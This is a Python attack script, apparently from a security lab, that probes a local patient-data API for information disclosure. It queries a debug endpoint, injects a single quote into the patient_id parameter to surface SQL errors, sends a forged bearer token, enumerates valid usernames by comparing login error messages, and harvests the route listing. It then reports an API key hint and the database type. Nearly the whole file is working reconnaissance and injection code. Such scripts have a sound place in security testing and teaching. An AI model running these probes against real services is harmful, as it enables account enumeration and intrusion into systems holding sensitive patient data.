"""
Information Disclosure Attack
==============================
Extracts sensitive information from verbose errors and debug endpoints
"""

import requests

BASE_URL = "http://localhost:8080"

def test_info_disclosure():
    print("\n" + "="*50)
    print("INFORMATION DISCLOSURE ATTACK")
    print("="*50)
    
    # Test 1: Debug endpoint
    print("\n[*] Test 1: Checking for debug endpoint...")
    response = requests.get(f"{BASE_URL}/api/debug")
    if response.status_code == 200:
        data = response.json()
        print("    [FOUND] Debug endpoint exposed!")
        for key, value in data.items():
            print(f"    -> {key}: {value}")
    
    # Test 2: Error message disclosure
    print("\n[*] Test 2: Testing error message verbosity...")
    
    # Invalid SQL to trigger error
    response = requests.get(f"{BASE_URL}/api/readings", params={"patient_id": "'"})
    if response.status_code == 500:
        print(f"    [LEAK] Error message: {response.json().get('detail', '')[:100]}")
    
    # Invalid token
    response = requests.get(
        f"{BASE_URL}/api/patients",
        headers={"Authorization": "Bearer invalid.token.here"}
    )
    if response.status_code == 401:
        print(f"    [LEAK] Auth error: {response.json().get('detail', '')}")
    
    # Wrong username vs wrong password
    print("\n[*] Test 3: Username enumeration...")
    
    response = requests.post(
        f"{BASE_URL}/api/login",
        json={"username": "nonexistent", "password": "test"}
    )
    error1 = response.json().get('detail', '')
    
    response = requests.post(
        f"{BASE_URL}/api/login",
        json={"username": "admin", "password": "wrongpassword"}
    )
    error2 = response.json().get('detail', '')
    
    if error1 != error2:
        print(f"    [VULN] Different error messages reveal valid usernames!")
        print(f"    -> Wrong username: '{error1}'")
        print(f"    -> Wrong password: '{error2}'")
    
    # Test 4: API endpoint discovery
    print("\n[*] Test 4: Endpoint discovery via root...")
    response = requests.get(f"{BASE_URL}/")
    if response.status_code == 200:
        data = response.json()
        print("    [FOUND] Endpoints disclosed:")
        for endpoint in data.get('endpoints', []):
            print(f"    -> {endpoint}")
    
    print("\n" + "="*50)
    print("FINDINGS:")
    print("- Debug endpoint exposes API key hint")
    print("- SQL errors reveal database type (SQLite)")
    print("- Login errors enable username enumeration")
    print("- Root endpoint lists all API routes")
    print("="*50)

if __name__ == "__main__":
    test_info_disclosure()
